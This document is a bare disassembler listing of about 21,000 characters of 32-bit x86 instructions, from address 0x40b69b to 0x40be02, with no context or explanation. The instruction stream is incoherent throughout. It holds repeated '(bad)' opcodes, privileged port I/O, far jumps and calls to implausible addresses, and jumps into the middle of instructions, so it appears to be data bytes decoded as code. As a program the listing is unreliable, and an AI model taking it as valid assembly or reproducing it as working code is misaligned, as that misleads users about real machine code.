  40b69b:	sub    DWORD PTR [edx+0x711232d8],eax
  40b6a1:	iret   
  40b6a2:	das    
  40b6a3:	xor    al,0x4c
  40b6a5:	and    eax,0x95f7a727
  40b6aa:	mov    cl,0x6d
  40b6ac:	stos   DWORD PTR es:[edi],eax
  40b6ad:	pop    edx
  40b6ae:	aad    0x3d
  40b6b0:	je     0x40b65c
  40b6b2:	out    0x4c,ax
  40b6b5:	xor    al,BYTE PTR [ecx-0x803a2c8]
  40b6bb:	push   cs
  40b6bc:	fwait
  40b6bd:	in     eax,dx
  40b6be:	sbb    DWORD PTR [esi+0xe],esi
  40b6c1:	je     0x40b734
  40b6c3:	(bad)  
  40b6c4:	mov    eax,ds:0x3e0473d4
  40b6c9:	gs ss aaa 
  40b6cc:	mov    edi,0x8c52fd72
  40b6d1:	aad    0xe0
  40b6d3:	scas   al,BYTE PTR es:[edi]
  40b6d4:	mov    cl,0x91
  40b6d6:	lock ffree st(6)
  40b6d9:	xor    esi,DWORD PTR [eax+esi*8+0x768e340]
  40b6e0:	int    0xc1
  40b6e2:	arpl   WORD PTR [esi+0x147308c0],cx
  40b6e8:	xchg   ebp,esp
  40b6ea:	das    
  40b6eb:	mov    ecx,0x346e9422
  40b6f0:	sahf   
  40b6f1:	jge    0x40b692
  40b6f3:	fmul   st,st(4)
  40b6f5:	ds jns 0x40b751
  40b6f8:	and    DWORD PTR [esi+0xeb49408],0x44
  40b6ff:	fmul   DWORD PTR [eax-0x3ee279e7]
  40b705:	mov    DWORD PTR [esi-0x14],ebx
  40b708:	pushf  
  40b709:	dec    ebp
  40b70a:	jle    0x40b767
  40b70c:	xchg   ebx,eax
  40b70d:	addr16 mov edx,0x57ec9fc9
  40b713:	cmc    
  40b714:	loopne 0x40b731
  40b716:	loope  0x40b797
  40b718:	bt     DWORD PTR [edi],edi
  40b71b:	or     BYTE PTR [eax],dh
  40b71d:	xor    ebx,DWORD PTR [esi+0x76]
  40b720:	jbe    0x40b6b3
  40b722:	in     eax,0x5a
  40b724:	add    DWORD PTR [eax],eax
  40b726:	push   0x2c37fe12
  40b72b:	mov    bl,0x2d
  40b72d:	(bad)  
  40b72e:	jae    0x40b6b5
  40b730:	xor    ebx,edi
  40b732:	xor    bl,al
  40b734:	ss iret 
  40b736:	pushf  
  40b737:	popa   
  40b738:	and    DWORD PTR [ecx],ebx
  40b73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b73b:	jl     0x40b701
  40b73d:	(bad)  
  40b73e:	mov    cs,ebx
  40b740:	mov    esi,0xffb650a7
  40b745:	test   al,0x31
  40b747:	daa    
  40b748:	cmc    
  40b749:	and    al,BYTE PTR [edi+0x4542eda1]
  40b74f:	imul   ecx,eax,0xb3b32b2b
  40b755:	(bad)  
  40b756:	hlt    
  40b757:	mov    eax,ds:0xc55f371d
  40b75c:	pop    ebp
  40b75d:	jmp    0x40b756
  40b75f:	pop    ebp
  40b760:	in     al,0x98
  40b762:	in     al,dx
  40b763:	in     eax,dx
  40b764:	pop    eax
  40b765:	clc    
  40b766:	mov    esp,0x88c46e98
  40b76b:	ffree  st(0)
  40b76d:	mov    al,ds:0xd1f9cdb2
  40b772:	mov    al,ds:0x159a0940
  40b777:	imul   edi,DWORD PTR [esp+eiz*4],0x133c4ee0
  40b77e:	mov    al,0x69
  40b780:	aaa    
  40b781:	outs   dx,WORD PTR ds:[esi]
  40b783:	lds    edi,FWORD PTR [ebp+0x431e1d8d]
  40b789:	pop    eax
  40b78a:	jp     0x40b7a2
  40b78c:	fnsave fs:[edi+0x28e1a7a1]
  40b793:	scas   eax,DWORD PTR es:[edi]
  40b794:	or     eax,0x534a0da
  40b799:	or     DWORD PTR [esi+0x22],0x109a946a
  40b7a0:	cmp    al,0x2c
  40b7a2:	call   0xedac908d
  40b7a7:	xor    al,0x2d
  40b7a9:	adc    ecx,DWORD PTR [ebp-0x60382a4d]
  40b7af:	xchg   edi,eax
  40b7b0:	sub    al,0xbc
  40b7b2:	pop    edx
  40b7b3:	jl     0x40b80a
  40b7b5:	adc    eax,0xaec646bf
  40b7ba:	ret    0x531
  40b7bd:	not    DWORD PTR [eax+0x13]
  40b7c0:	fisub  DWORD PTR [edx]
  40b7c2:	cmp    eax,0x977b349
  40b7c7:	out    dx,al
  40b7c8:	sahf   
  40b7c9:	int    0x8f
  40b7cb:	cmp    eax,0x363d53f2
  40b7d0:	aad    0x71
  40b7d2:	int    0x77
  40b7d4:	scas   al,BYTE PTR es:[edi]
  40b7d5:	inc    edx
  40b7d6:	(bad)  
  40b7d7:	mov    edx,0xbfdc249c
  40b7dc:	into   
  40b7dd:	mov    ?,WORD PTR [eax-0x16]
  40b7e0:	int3   
  40b7e1:	mov    edi,cs
  40b7e3:	push   es
  40b7e4:	dec    esp
  40b7e5:	mov    ecx,0x5c45dbc4
  40b7ea:	cs scas al,BYTE PTR es:[edi]
  40b7ec:	push   esi
  40b7ed:	jbe    0x40b848
  40b7ef:	fwait
  40b7f0:	stos   BYTE PTR es:[edi],al
  40b7f1:	push   es
  40b7f2:	call   0x972df408
  40b7f7:	inc    esi
  40b7f8:	jmp    0x3fd1f256
  40b7fd:	adc    al,0x33
  40b7ff:	ret    
  40b800:	sbb    al,0xd1
  40b802:	out    dx,al
  40b803:	add    bh,BYTE PTR [ebp+0x7]
  40b806:	pop    ecx
  40b807:	mov    es,esi
  40b809:	dec    ebp
  40b80a:	push   ebp
  40b80b:	mov    edx,0xdf3f7e77
  40b810:	adc    al,0x9a
  40b813:	loope  0x40b85d
  40b815:	sbb    eax,0x6bf27887
  40b81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81b:	mov    ebp,ebp
  40b81d:	mov    ebp,0x662a42fb
  40b822:	xchg   BYTE PTR [edi+edi*4],cl
  40b825:	ds pushf 
  40b827:	int3   
  40b828:	mov    al,ds:0x79fd5d8d
  40b82d:	repnz add ch,ch
  40b830:	ret    0x35c7
  40b833:	repz add DWORD PTR [ebx],eax
  40b836:	and    dl,BYTE PTR [edi+0x16]
  40b839:	or     ch,0x5e
  40b83c:	out    0x5a,al
  40b83e:	jo     0x40b868
  40b840:	pop    edi
  40b841:	bound  esi,QWORD PTR [esp+edi*2-0x1d0860be]
  40b848:	jl     0x40b889
  40b84a:	test   eax,0x1e653b9f
  40b84f:	loopne 0x40b8b2
  40b851:	std    
  40b852:	scas   eax,DWORD PTR es:[edi]
  40b853:	push   edx
  40b854:	loop   0x40b86e
  40b856:	jl     0x40b898
  40b858:	les    edx,FWORD PTR [eax+0x66]
  40b85b:	lods   al,BYTE PTR ds:[esi]
  40b85c:	jae    0x40b859
  40b85e:	ror    dl,0x9
  40b861:	lahf   
  40b862:	fcomp  DWORD PTR [edi]
  40b864:	aas    
  40b865:	and    bh,BYTE PTR [esi+0x5e26f7a9]
  40b86b:	pop    ds
  40b86c:	jmp    0x4af2:0x7eae198a
  40b873:	cmp    ah,BYTE PTR [eax-0x2d05346e]
  40b879:	daa    
  40b87a:	jne    0x40b856
  40b87c:	jmp    0xea7291c1
  40b881:	mov    ds:0xa5682ba8,eax
  40b886:	fld    DWORD PTR [esi+0x2a]
  40b889:	scas   al,BYTE PTR es:[edi]
  40b88a:	mov    ecx,0x7eeee565
  40b88f:	pop    ebp
  40b890:	mov    eax,0xed904d9c
  40b895:	dec    esp
  40b896:	(bad)  
  40b897:	fndisi(8087 only) 
  40b899:	mov    edi,0x1470e1b9
  40b89e:	push   esp
  40b89f:	xor    DWORD PTR gs:[ebx+0x77],esi
  40b8a3:	xor    bh,BYTE PTR [eax]
  40b8a5:	pop    ss
  40b8a6:	push   ebp
  40b8a7:	xchg   edx,esi
  40b8a9:	out    0x5d,al
  40b8ab:	push   0x3f
  40b8ad:	inc    eax
  40b8ae:	ss cmp al,0x1f
  40b8b1:	fs jno 0x40b873
  40b8b4:	lahf   
  40b8b5:	xchg   ebx,eax
  40b8b6:	sub    DWORD PTR [esi],edi
  40b8b8:	sahf   
  40b8b9:	jmp    0xb1ff554e
  40b8be:	cwde   
  40b8bf:	jge    0x40b8af
  40b8c1:	fidivr WORD PTR [eax-0x3a]
  40b8c4:	xor    BYTE PTR [edx],cl
  40b8c6:	push   DWORD PTR [edi+0xe41e48d]
  40b8cc:	cmp    DWORD PTR [eax+0x5b9f021c],0xffffffc8
  40b8d3:	cmp    dl,BYTE PTR [esi]
  40b8d5:	dec    DWORD PTR [ebp+eax*8+0x3f]
  40b8d9:	repnz xlat BYTE PTR ds:[ebx]
  40b8db:	xor    DWORD PTR [ecx],eax
  40b8dd:	mov    eax,edi
  40b8df:	cli    
  40b8e0:	adc    DWORD PTR [esi],edx
  40b8e2:	imul   eax,DWORD PTR [edx+0x401259d],0x398f813d
  40b8ec:	outs   dx,BYTE PTR ds:[esi]
  40b8ed:	xlat   BYTE PTR ds:[ebx]
  40b8ee:	mov    esp,0xbe2eda29
  40b8f3:	ret    0x37f
  40b8f6:	sub    eax,0xc74fe863
  40b8fb:	jle    0x40b924
  40b8fd:	jp     0x40b925
  40b8ff:	push   es
  40b900:	cmc    
  40b901:	push   cs
  40b902:	outs   dx,DWORD PTR ds:[esi]
  40b903:	repz mov ah,al
  40b906:	inc    eax
  40b907:	inc    ecx
  40b908:	sbb    DWORD PTR [eax-0x4e766a46],ebp
  40b90e:	mov    bl,0x93
  40b910:	push   0x7b
  40b912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b913:	cmp    al,0x6d
  40b915:	mov    ch,0xb3
  40b917:	pop    esi
  40b918:	add    eax,DWORD PTR [esi]
  40b91a:	sar    DWORD PTR [edx],cl
  40b91c:	pusha  
  40b91d:	add    BYTE PTR [ecx-0x5c78e4b9],ch
  40b923:	lods   al,BYTE PTR ds:[esi]
  40b924:	test   DWORD PTR [edi+0x724ee22],ecx
  40b92a:	pop    ecx
  40b92b:	or     BYTE PTR [edi-0x75],cl
  40b92e:	int    0xd8
  40b930:	jl     0x40b944
  40b932:	mov    eax,0xb4ab51c5
  40b937:	add    ch,BYTE PTR [esi]
  40b939:	jge    0x40b901
  40b93b:	jne    0x40b93d
  40b93d:	xchg   esi,eax
  40b93e:	sub    DWORD PTR [edi+0x300736d6],0x46
  40b945:	cmp    al,dh
  40b947:	imul   edi,DWORD PTR [eax-0x4f],0x468e34d2
  40b94e:	and    al,0xfb
  40b950:	aaa    
  40b951:	cmp    al,0x5b
  40b953:	mov    esi,0x3b542005
  40b958:	xor    eax,0x1143ac86
  40b95d:	ins    DWORD PTR es:[edi],dx
  40b95e:	dec    eax
  40b95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b960:	pop    ebp
  40b961:	jb     0x40b93d
  40b963:	pop    ss
  40b964:	scas   eax,DWORD PTR es:[edi]
  40b965:	es repnz into 
  40b968:	lods   eax,DWORD PTR ds:[esi]
  40b969:	push   esi
  40b96a:	or     al,0xec
  40b96c:	clc    
  40b96d:	mov    bl,0xf0
  40b96f:	ss shl BYTE PTR gs:[ebx],0x72
  40b974:	xchg   ecx,eax
  40b975:	xchg   edi,eax
  40b976:	out    dx,eax
  40b977:	jo     0x40b924
  40b979:	sbb    ch,ah
  40b97b:	in     al,dx
  40b97c:	cmp    eax,0x26b9f1c5
  40b981:	popf   
  40b982:	fldenv [ecx+edi*2]
  40b985:	mov    eax,0xe73445b3
  40b98a:	aaa    
  40b98b:	(bad)  
  40b98d:	adc    DWORD PTR [ebp-0x72],ebx
  40b990:	jo     0x40b98b
  40b992:	call   0x167c:0xbb16137b
  40b999:	(bad)  
  40b99a:	push   ebp
  40b99b:	add    DWORD PTR [ecx+0x7219486d],eax
  40b9a1:	cwde   
  40b9a2:	(bad)  
  40b9a3:	cmp    eax,0xb0e6c024
  40b9a8:	pusha  
  40b9a9:	test   al,0x38
  40b9ab:	xchg   edx,eax
  40b9ac:	mov    ds:0xa894bacb,eax
  40b9b1:	xchg   edx,eax
  40b9b2:	jmp    DWORD PTR [esi]
  40b9b4:	adc    ebp,esp
  40b9b6:	fs jle 0x40b9cc
  40b9b9:	xor    esp,DWORD PTR [ebp+0x275343eb]
  40b9bf:	mov    DWORD PTR [eax+0x5ff1df9a],eax
  40b9c5:	adc    dl,BYTE PTR [esi]
  40b9c7:	or     eax,DWORD PTR [ebx+0x33]
  40b9ca:	add    DWORD PTR ds:0x619a33b6,esi
  40b9d0:	mov    edi,0xdfe1a89
  40b9d5:	sub    ah,dh
  40b9d7:	std    
  40b9d8:	add    edx,edi
  40b9da:	dec    eax
  40b9db:	mov    ebx,0x4f27ddb2
  40b9e0:	mov    esi,DWORD PTR [edx]
  40b9e2:	lock jnp 0x40b9ec
  40b9e5:	pop    eax
  40b9e6:	push   esp
  40b9e7:	mov    edi,0x242b444f
  40b9ec:	bound  edx,QWORD PTR [ecx+0x54]
  40b9ef:	mov    ebx,0x413a3dca
  40b9f4:	sub    al,0x57
  40b9f6:	sub    dh,BYTE PTR [ebx+0x52]
  40b9f9:	out    0x27,eax
  40b9fb:	push   edx
  40b9fc:	in     al,dx
  40b9fd:	das    
  40b9fe:	or     DWORD PTR [eax-0x3acb0228],esp
  40ba04:	xlat   BYTE PTR ds:[ebx]
  40ba05:	push   ebx
  40ba06:	or     BYTE PTR [ecx+0x8],dh
  40ba09:	or     eax,0xf9803cb9
  40ba0e:	push   es
  40ba0f:	ja     0x40b992
  40ba11:	sbb    edi,DWORD PTR [ebp-0x1d]
  40ba14:	jae    0x40b9f0
  40ba16:	retf   
  40ba17:	sub    ebp,DWORD PTR [edx+ebx*8]
  40ba1a:	out    0x7d,al
  40ba1c:	(bad)  
  40ba1d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba1f:	xor    al,0xec
  40ba21:	rcl    BYTE PTR [ecx+0x5f44ab87],0x4e
  40ba28:	mov    esi,0xc615a505
  40ba2d:	sbb    DWORD PTR [edx+0x3a21781d],edi
  40ba33:	push   ebp
  40ba34:	cmp    eax,DWORD PTR [ebx+0x2cbba1ed]
  40ba3a:	mov    ah,0x27
  40ba3c:	pushf  
  40ba3d:	push   esi
  40ba3e:	mov    bh,BYTE PTR [ecx+0x31333482]
  40ba44:	sbb    BYTE PTR [eax],ah
  40ba46:	loop   0x40ba8f
  40ba48:	retf   
  40ba49:	aam    0x92
  40ba4b:	jg     0x40ba17
  40ba4d:	jl     0x40ba5c
  40ba4f:	fwait
  40ba50:	xlat   BYTE PTR ds:[ebx]
  40ba51:	xor    ebx,ebx
  40ba53:	xor    BYTE PTR [ecx+0x78],ch
  40ba56:	rcl    BYTE PTR [esi-0x5f],0xe2
  40ba5a:	push   edx
  40ba5b:	bnd jae 0x40ba09
  40ba5e:	mov    ebp,0x4da79009
  40ba63:	mov    ds:0x776c598,eax
  40ba68:	pushf  
  40ba69:	test   bl,bl
  40ba6b:	cmp    dl,BYTE PTR cs:[edx]
  40ba6e:	jle    0x40ba8c
  40ba70:	call   0x6d2ded67
  40ba75:	xchg   edi,eax
  40ba76:	xchg   ecx,eax
  40ba77:	jo     0x40bac0
  40ba79:	cmp    DWORD PTR [edx-0x3980a864],0x65
  40ba80:	pop    eax
  40ba81:	pop    ebx
  40ba82:	lahf   
  40ba83:	xchg   ebp,eax
  40ba84:	jno    0x40ba19
  40ba86:	add    al,0x83
  40ba88:	clc    
  40ba89:	ds xchg ebx,eax
  40ba8b:	and    BYTE PTR [edi+0x54b062a7],al
  40ba91:	add    al,0xe3
  40ba93:	or     BYTE PTR [ecx],dh
  40ba95:	mov    bl,0xf5
  40ba97:	icebp  
  40ba98:	(bad)  
  40ba99:	or     edi,ecx
  40ba9b:	popa   
  40ba9c:	into   
  40ba9d:	adc    bh,al
  40ba9f:	fld    DWORD PTR [edx]
  40baa1:	loope  0x40ba36
  40baa3:	add    eax,0x4e1a9695
  40baa8:	jne    0x40ba89
  40baaa:	inc    eax
  40baab:	fsub   DWORD PTR [edx+ebp*4+0x4fee175f]
  40bab2:	out    0xcf,eax
  40bab4:	fistp  DWORD PTR [ebx-0x4b]
  40bab7:	sub    eax,0x33e25376
  40babc:	mov    esi,0x480dee90
  40bac1:	ins    DWORD PTR es:[edi],dx
  40bac2:	imul   edx,DWORD PTR [edx-0x7d856562],0x82cabe1b
  40bacc:	sub    al,0x23
  40bace:	outs   dx,DWORD PTR ds:[esi]
  40bacf:	cmp    ah,ah
  40bad1:	dec    esi
  40bad2:	scas   al,BYTE PTR es:[edi]
  40bad3:	sub    cl,cl
  40bad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bad6:	leave  
  40bad7:	mov    bl,0x49
  40bad9:	add    DWORD PTR [ecx-0x60],0xe745316f
  40bae0:	mov    al,0x84
  40bae2:	mov    esi,0x69caee28
  40bae7:	inc    edi
  40bae8:	adc    BYTE PTR [esi],cl
  40baea:	jns    0x40bb3d
  40baec:	mov    bh,0xca
  40baee:	push   0x5b
  40baf0:	xor    BYTE PTR [ebx],0xf9
  40baf3:	scas   al,BYTE PTR es:[edi]
  40baf4:	jl     0x40badc
  40baf6:	imul   esp,edi,0x19
  40baf9:	mov    edi,edi
  40bafb:	ds xor al,0xb8
  40bafe:	mov    ch,0xca
  40bb00:	out    0xb5,eax
  40bb02:	dec    eax
  40bb03:	into   
  40bb04:	xlat   BYTE PTR ds:[ebx]
  40bb05:	sbb    eax,0xf3e2eec1
  40bb0a:	aas    
  40bb0b:	loopne 0x40bb13
  40bb0d:	frstor [ecx-0xc]
  40bb10:	jbe    0x40baa9
  40bb12:	icebp  
  40bb13:	xchg   ebx,eax
  40bb14:	bound  edi,QWORD PTR [ebx+0x23]
  40bb17:	popf   
  40bb18:	das    
  40bb19:	std    
  40bb1a:	lds    esi,FWORD PTR [ecx-0x5e3d990b]
  40bb20:	in     eax,0xa9
  40bb22:	mov    bh,cl
  40bb24:	sbb    BYTE PTR [esi],dh
  40bb26:	push   edx
  40bb27:	cmp    al,0x2b
  40bb29:	pop    es
  40bb2a:	xor    eax,0xc60192b7
  40bb2f:	sub    edx,edx
  40bb31:	inc    eax
  40bb32:	jmp    0xc011:0x4c1cdf92
  40bb39:	(bad)  
  40bb3a:	mov    esp,0x889d7d9e
  40bb3f:	add    al,0xc
  40bb41:	adc    ah,al
  40bb43:	mov    al,ds:0xed5038ab
  40bb48:	mov    ah,0x4e
  40bb4a:	add    dl,BYTE PTR [ecx+0x72]
  40bb4d:	jmp    0x40bbbd
  40bb4f:	aas    
  40bb50:	jecxz  0x40bae4
  40bb52:	mov    dh,0x2e
  40bb54:	lahf   
  40bb55:	pop    ebx
  40bb56:	xlat   BYTE PTR ds:[ebx]
  40bb57:	fcomp  QWORD PTR [esi-0x6f]
  40bb5a:	mov    al,ds:0xe19c133c
  40bb5f:	dec    eax
  40bb60:	nop
  40bb61:	jmp    0x40bb40
  40bb63:	(bad)  
  40bb64:	hlt    
  40bb65:	inc    esi
  40bb66:	cmp    BYTE PTR [edx],ch
  40bb68:	dec    eax
  40bb69:	outs   dx,DWORD PTR ds:[esi]
  40bb6a:	cs pop eax
  40bb6c:	int3   
  40bb6d:	outs   dx,BYTE PTR ds:[esi]
  40bb6e:	add    al,0x69
  40bb70:	je     0x40bb6f
  40bb72:	(bad)  
  40bb73:	ds push 0xb731d698
  40bb79:	lds    eax,FWORD PTR [edi]
  40bb7b:	mov    DWORD PTR [ebx+0x41],ecx
  40bb7e:	cmp    al,BYTE PTR [edi]
  40bb80:	ficom  WORD PTR [esi-0x5f]
  40bb83:	test   BYTE PTR [ebx+0x3d7fc72e],dh
  40bb89:	neg    DWORD PTR [esi-0x20]
  40bb8c:	lahf   
  40bb8d:	jge    0x40bbe4
  40bb8f:	xchg   BYTE PTR [ebx+ebp*1],dl
  40bb92:	add    eax,0x50928605
  40bb97:	dec    ecx
  40bb98:	xor    BYTE PTR [ebx-0x7a],dl
  40bb9b:	xor    bh,ah
  40bb9d:	xchg   edx,eax
  40bb9e:	rcl    BYTE PTR [edi+0x7675a509],0xd
  40bba5:	sbb    BYTE PTR [eax],0x7b
  40bba8:	pop    ss
  40bba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbaa:	lahf   
  40bbab:	mov    bl,0x5
  40bbad:	imul   ebx,DWORD PTR [edi+0x37d55494],0xaa5d835d
  40bbb7:	xchg   esp,eax
  40bbb8:	push   0x30
  40bbba:	mov    dh,0xe4
  40bbbc:	jo     0x40bb54
  40bbbe:	jne    0x40bc1c
  40bbc0:	retf   
  40bbc1:	pusha  
  40bbc2:	adc    esp,DWORD PTR [esp-0x6af364f4]
  40bbc9:	stc    
  40bbca:	sbb    ecx,DWORD PTR [ecx]
  40bbcc:	xchg   DWORD PTR [ecx-0x2e],ebx
  40bbcf:	xchg   edx,eax
  40bbd0:	push   ebp
  40bbd1:	ja     0x40bc3f
  40bbd3:	mov    al,0x7b
  40bbd5:	sar    DWORD PTR [eax+0x8],1
  40bbd8:	loop   0x40bb9d
  40bbda:	popa   
  40bbdb:	cld    
  40bbdc:	call   0xa9b0:0xd6327cc3
  40bbe3:	add    dh,BYTE PTR [ebx+0x45]
  40bbe6:	or     al,0x79
  40bbe9:	sbb    BYTE PTR [eax+ecx*1-0x44ae8f07],bl
  40bbf0:	setle  BYTE PTR [edx*8+0x6a4ad262]
  40bbf8:	inc    edi
  40bbf9:	xor    cl,BYTE PTR fs:[ecx]
  40bbfc:	sahf   
  40bbfd:	fiadd  DWORD PTR [eax-0x2]
  40bc00:	(bad)  
  40bc01:	adc    eax,0x33df5896
  40bc06:	fmul   st,st(5)
  40bc08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc09:	jbe    0x40bc44
  40bc0b:	or     edi,edx
  40bc0d:	lea    ecx,[esi+0x55f8944f]
  40bc13:	test   eax,0xa8b483c2
  40bc18:	popf   
  40bc19:	sub    DWORD PTR [ebx],0x16131612
  40bc1f:	mov    bh,0x53
  40bc21:	cli    
  40bc22:	xchg   edi,eax
  40bc23:	inc    eax
  40bc24:	jle    0x40bbd3
  40bc26:	aas    
  40bc27:	rdpmc  
  40bc29:	stos   BYTE PTR es:[edi],al
  40bc2a:	sub    eax,0xbd1fd1cb
  40bc2f:	lock mov bh,bh
  40bc32:	mov    BYTE PTR [edi-0x5a],bl
  40bc35:	rcl    DWORD PTR [ebx+0x7f],0xc3
  40bc39:	sub    DWORD PTR [esi*1+0x69a0cd17],esi
  40bc40:	fsubrp st(2),st
  40bc42:	pop    ebx
  40bc43:	imul   esp,DWORD PTR ss:[ebx+0x2a78efae],0x14a8cab
  40bc4e:	pop    edi
  40bc4f:	adc    al,0x59
  40bc51:	inc    edi
  40bc52:	sub    eax,0x7bde8ecf
  40bc57:	cmp    eax,DWORD PTR [esi+edx*8]
  40bc5a:	arpl   dx,sp
  40bc5c:	sbb    eax,ebx
  40bc5e:	int    0xce
  40bc60:	arpl   ax,sp
  40bc62:	pop    ebx
  40bc63:	inc    ebx
  40bc64:	enter  0x3325,0xee
  40bc68:	add    BYTE PTR [ecx-0x5],al
  40bc6b:	jg     0x40bcd3
  40bc6d:	or     eax,0xa89295f4
  40bc72:	mov    al,0x9f
  40bc74:	mov    eax,0x5ad2a6d0
  40bc79:	xchg   ecx,eax
  40bc7a:	and    eax,0x56746add
  40bc7f:	bound  ecx,QWORD PTR [esp+ecx*4]
  40bc82:	fidiv  WORD PTR [edi-0x5b]
  40bc85:	push   cs
  40bc86:	sahf   
  40bc87:	cmp    ebp,DWORD PTR ds:0x206a217a
  40bc8d:	ret    
  40bc8e:	mov    al,0x44
  40bc90:	data16 cmc 
  40bc92:	and    al,0x44
  40bc94:	dec    ebx
  40bc95:	or     esp,DWORD PTR [esi]
  40bc97:	mov    edi,DWORD PTR [eax]
  40bc99:	inc    edi
  40bc9a:	sbb    DWORD PTR [eax-0x18006c0e],esi
  40bca0:	sub    al,0x9d
  40bca2:	add    BYTE PTR [ecx+0x34],bl
  40bca5:	sbb    BYTE PTR [edx-0x2eee670],al
  40bcab:	xchg   edi,eax
  40bcac:	xor    DWORD PTR [esi-0x432da044],ecx
  40bcb2:	cli    
  40bcb3:	enter  0xa296,0xba
  40bcb7:	cmc    
  40bcb8:	rol    DWORD PTR [esi+0x45c686f3],cl
  40bcbe:	stos   DWORD PTR es:[edi],eax
  40bcbf:	shl    BYTE PTR [ecx],1
  40bcc1:	mov    esi,0x5b4e9dda
  40bcc6:	push   es
  40bcc7:	xor    al,0x2a
  40bcc9:	add    edi,DWORD PTR [edx+0x47fb387b]
  40bccf:	out    0xa,al
  40bcd1:	hlt    
  40bcd2:	enter  0xab86,0x57
  40bcd6:	out    0xc2,eax
  40bcd8:	mov    ah,0x29
  40bcda:	test   DWORD PTR [ebx+0x2a],edi
  40bcdd:	cmc    
  40bcde:	jl     0x40bc60
  40bce0:	xor    BYTE PTR [eax-0x36a2b36a],al
  40bce6:	push   edi
  40bce7:	nop
  40bce8:	jns    0x40bcda
  40bcea:	sbb    BYTE PTR [ebp-0x3e],dh
  40bced:	push   es
  40bcee:	add    al,0xc2
  40bcf0:	icebp  
  40bcf1:	cwde   
  40bcf2:	push   edx
  40bcf3:	pushf  
  40bcf4:	call   0x24397034
  40bcf9:	scas   al,BYTE PTR es:[edi]
  40bcfa:	in     al,0x96
  40bcfc:	xchg   esp,eax
  40bcfd:	fldenv [edi+ebp*4-0x25]
  40bd01:	dec    esi
  40bd02:	pminub mm7,QWORD PTR [ecx+0x1894ada9]
  40bd09:	in     al,dx
  40bd0a:	data16 scas al,BYTE PTR es:[edi]
  40bd0c:	add    eax,0x2efe6a
  40bd11:	fst    DWORD PTR [ecx-0x4ca53859]
  40bd17:	mov    ds:0xa2ac987,eax
  40bd1c:	fwait
  40bd1d:	(bad)  
  40bd1e:	adc    bl,dh
  40bd20:	mov    ah,0xb0
  40bd22:	fsubr  QWORD PTR [ebp-0x4]
  40bd25:	cli    
  40bd26:	or     al,0x6d
  40bd28:	aam    0xde
  40bd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd2b:	iret   
  40bd2c:	dec    ebx
  40bd2d:	in     eax,0x96
  40bd2f:	cmp    ebx,DWORD PTR [edi-0x3b]
  40bd32:	sbb    al,0x6f
  40bd34:	pop    ebx
  40bd35:	ins    BYTE PTR es:[edi],dx
  40bd36:	inc    esi
  40bd37:	ficomp WORD PTR [ecx]
  40bd39:	mov    esp,0x52ab8523
  40bd3e:	mov    bl,0x99
  40bd40:	loopne 0x40bd1e
  40bd42:	pop    ecx
  40bd43:	fisubr WORD PTR [eax-0x62]
  40bd46:	scas   eax,DWORD PTR es:[edi]
  40bd47:	mov    eax,ds:0x3fab4989
  40bd4c:	ret    
  40bd4d:	fmul   st,st(5)
  40bd4f:	fidivr WORD PTR [ecx-0x5d3046]
  40bd55:	dec    eax
  40bd56:	pop    edi
  40bd57:	pop    ss
  40bd58:	jns    0x40bda5
  40bd5a:	push   ecx
  40bd5b:	cmp    esi,DWORD PTR [ebx-0x4ffa26d2]
  40bd61:	retf   
  40bd62:	push   ss
  40bd63:	jno    0x40bd6f
  40bd65:	mov    esi,0x673757ab
  40bd6a:	cdq    
  40bd6b:	mov    eax,ds:0x3f4b1638
  40bd70:	cmc    
  40bd71:	xchg   ebx,eax
  40bd72:	jle    0x40bd9d
  40bd74:	test   eax,0x335ae231
  40bd79:	mov    WORD PTR [ebx+0x20215d2f],es
  40bd7f:	loopne 0x40bdfe
  40bd81:	adc    DWORD PTR [esi+esi*4],esi
  40bd84:	ficomp DWORD PTR [ebx-0xf]
  40bd87:	sar    ecx,1
  40bd89:	sbb    eax,0x5ef55ef8
  40bd8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd8f:	adc    DWORD PTR [ecx+edx*4-0x51],0x50dd1032
  40bd97:	adc    edx,DWORD PTR [eax+edx*1+0x2a]
  40bd9b:	add    al,0x53
  40bd9d:	cmp    ecx,ebp
  40bd9f:	ss jecxz 0x40bd49
  40bda2:	xchg   ecx,eax
  40bda3:	stos   DWORD PTR es:[edi],eax
  40bda4:	mov    WORD PTR [esi-0x1e22be4f],fs
  40bdaa:	scas   eax,DWORD PTR es:[edi]
  40bdab:	mov    dl,0x7a
  40bdad:	test   DWORD PTR [esi+0xc6b8bad],0x7638430
  40bdb7:	and    DWORD PTR [ecx-0x33],ecx
  40bdba:	xor    DWORD PTR [ebx],ebx
  40bdbc:	pop    ds
  40bdbd:	daa    
  40bdbe:	jb     0x40bd63
  40bdc0:	iret   
  40bdc1:	push   ss
  40bdc2:	ror    edx,1
  40bdc4:	pop    ebx
  40bdc5:	cmp    dh,BYTE PTR [ebx+0x71a7c5df]
  40bdcb:	mov    al,dh
  40bdcd:	loopne 0x40be43
  40bdcf:	aam    0xef
  40bdd1:	repnz cdq 
  40bdd3:	test   DWORD PTR [esi],ebp
  40bdd5:	add    esp,DWORD PTR [eax]
  40bdd7:	mov    bh,BYTE PTR [ecx+edx*2-0x4e978b72]
  40bdde:	jo     0x40be3c
  40bde0:	ret    
  40bde1:	cmc    
  40bde2:	or     DWORD PTR [eax+0x50],ebx
  40bde5:	ret    
  40bde6:	fbld   TBYTE PTR [ebp-0x3c]
  40bde9:	jmp    FWORD PTR [edi]
  40bdeb:	inc    edi
  40bdec:	jb     0x40bdd9
  40bdee:	push   ds
  40bdef:	pop    ecx
  40bdf0:	and    DWORD PTR [edi-0x40],0xffffffb6
  40bdf4:	mov    edi,0x3b2bf8c6
  40bdf9:	shl    BYTE PTR [esi],1
  40bdfb:	pop    ebx
  40bdfc:	xchg   ebx,eax
  40bdfd:	loop   0x40bd89
  40bdff:	sub    al,0x77
  40be01:	leave  
  40be02:	sbb    esi,DWORD PTR [esi+ebp*4-0x56e9cbb1]
